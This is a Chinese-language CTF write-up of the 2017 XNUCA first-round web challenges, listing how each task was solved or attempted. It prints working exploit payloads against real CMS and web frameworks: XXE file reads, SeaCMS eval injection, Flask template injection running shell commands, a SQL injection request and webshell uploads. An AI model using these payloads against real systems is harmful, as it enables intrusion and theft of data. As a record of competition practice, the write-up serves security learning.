---
title: 2017 XNUCA-第一期：Web WriteUp
tags:
  - CTF
  - WriteUp
  - CMS
  - EXP
  - getshell
date: 2017-08-30 22:34:58
---

## #No.1 你喜欢颜文字么

重置密码输入admin和喜欢就拿下flag了
<!-- more -->

## #No.2 让你无语的md5

输入admin提示非法，输入admin加一个空格拿到一个md5，解密得到flag

## #No.3 Pav1和lloowweerr...

`FFmpeg任意文件读取`漏洞，构造读取flag文件的avi，上传后下载打开得到flag
参考链接：[http://www.freebuf.com/vuls/138377.html](http://www.freebuf.com/vuls/138377.html)

## #No.4 X-NUCA 2017’s S...

没做出来
ROIS WriteUp:
```
/res/site.war 下载源码 zip 解压 jd-gui 看 class
注册的时候加一个 isActive=1 就能登录
然后现在是要让 isSupaAdministrata=1
参考 http://blog.csdn.net/qq_27446553/article/details/73480823 对象自动绑定
拿到http://a4b359466421ae3aa76a8b116dda3870.xnuca.cn/res/HYGorlL29LtcMCR6GUg23XRM
JxVge5F7.js
```

## #No.5 Lucky Number Ca...

`Xxe`，构造post内容如下，但是死都找不到flag，赛后听说在/etc/hosts，感觉这种藏着掖着flag的题很没意思
```xml
<!DOCTYPE xdsec[
<!ELEMENT methodname ANY>
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">]>
<user><name>&file;</name></user>
```

## #No.6 Hello World
看提示直接fuzz到.git目录，下载下来后可以看到代码。
有个`flag.php` 和`flag.js`，flag.php提示flag not here
猜测用了git的修改记录隐藏数据，在日志中看不到其他的修改日志
可以用`显示引用记录`的方式查看。
然后又找到一个flag.js比较两个flag.js得到`flag{82efc37f1cd5d4636ea7cadcd5a814a2}`

## #No.7 xblog

有源码泄露，但是没做出来

## #No.8 看视频真嗨皮

`海洋cms`
找到`exp`构造`post`数据即可
```
http://567252405122515e0ed912af9b26d404.xnuca.cn/search.php?searchtype=5
```
post数据：
```
searchword=d&order=}{endif}{if:1)eval($_POST[x]);if(1}{end if}&x=$TxtRes=file_put_contents("writeHere/da6afcecd8a4915e67964700d2008d29", "test");echo 666;
```
参考链接：[http://www.bugku.com/forum.php?mod=viewthread&amp;tid=28](http://www.bugku.com/forum.php?mod=viewthread&amp;tid=28)

## #No.9 The Best Commun...

`Dolphin`
直接exp打，本来就想随便试一试结果直接进到一个命令行模式，就是成功了，输入system();命令拿flag
参考链接：[https://www.seebug.org/vuldb/ssvid-92546](https://www.seebug.org/vuldb/ssvid-92546)

## #No.10 买买买！

没做

## #No.11 两只小蜜蜂啊

`Beescms`
跟着exp走，先拿后台权限在上传shell
参考链接：https://bbs.ichunqiu.com/thread-13977-1-1.html?from=jike

## #No.12 社工库

没做

## #No.13 程序员怎么能不知道Jenkin...

`Jenkins`
找到了exp但是没打成功

## #No.14 试一试

`多米cms`，有个通用注入漏洞，但是好像加了waf，没有花时间去绕过，没做出来
ROIS的payload：`search.php?jq=1);system(dir);//&searchtype=5`

## #No.15 猜一猜

`Joomla`

没做出来

## #No.16 来一发flask

`Flask`
```
http://062ed0f9233795319ceac93209b40860.xnuca.cn/invalid{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/flag.txt').read() }}
```
只读了flag，写的部分没有成功
参考链接：http://www.freebuf.com/articles/web/98928.html
ROIS:
```
{{ [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].popen('id').read() }}
```


## #No.17 简单点

`CMS Made Simpl CMS`

没做出来

## #No.18 “开讲啦”

`Acontent`，查到了cve但是没利用成功
Ph0en1x WriteUp：
[https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/](https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/)
```
http://8d52640a73d8073066c951df0501184a.xnuca.cn/oauth/lti/common/tool_provider_outcome.php
POST:
grade=1&key=1&secret=secret&sourcedid=1&submit=Send%20Grade&url=/etc/flag.txt
```

## #No.19 写个简历吧

没做

## #No.20 SQL注入

也是`Joomla`，没做

## #No.21 Freecms

`Freecms`
Struts2-045直接打`http://cc7777fe6a8ce0d9544b623a0d2961fb.xnuca.cn/login_login.do`
`echo "111" >/opt/apache-tomcat-8.0.44/webapps/ROOT/writeHere/da6afcecd8a4915e67964700d2008d29`

## #No.22 Phpcms_v9

`Phpcms9.6.3`，没做出来，貌似还加了waf

## #No.23 找入口

`Wolfcms`
admin admin 进后台，上传php拿到shell
参考链接：http://blog.csdn.net/hitwangpeng/article/details/45620701

## #No.24 可爱的星星

`Sitestar 建站之星`，没找到可用exp
ROIS:
```http
POST /index.php?_a=do_mail&_m=mod_email HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Cookie: PHPSESSID=65676uue8hmaigepggn66pn1l6
Host: 522e52f9f4f81b75b2718ad29ac60c14.xnuca.cn
Connection: close
User-Agent: Paw/3.1.2 (Macintosh; OS X/10.12.6) GCDHTTPRequest
Content-Length: 112
title=aa&email_s=a&email_m=a&type=a&users=aaaa%27%7Caaa&role%5B%5D=abdc%7D%27+union+select+
1%2Cuser%28%29%2C3%23
```
注入得到 `admin` 密码 `1234!@#$`
登录之后上传图片，文件管理中重命名为.php

## #No.25 愉快的玩耍吧

`Metinfo cms`
跟着exp，重置admin密码为1234567，进后台上传test.php打包成的zip，type改成skin，然后templates/test.php就是flag
参考链接：https://www.secpulse.com/archives/41084.html

## #No.26 挑战自我

没做

## #总结

整个比赛难度中等，基本都是在找现成exp，我们队除了MD5那题其他都是我A的，中间一度霸占榜一，但是最终排名第九，要反思的还是很多的。
放个图纪念曾经的榜一。
![](http://ovm02pvss.bkt.clouddn.com/2017xnuca1.jpg)
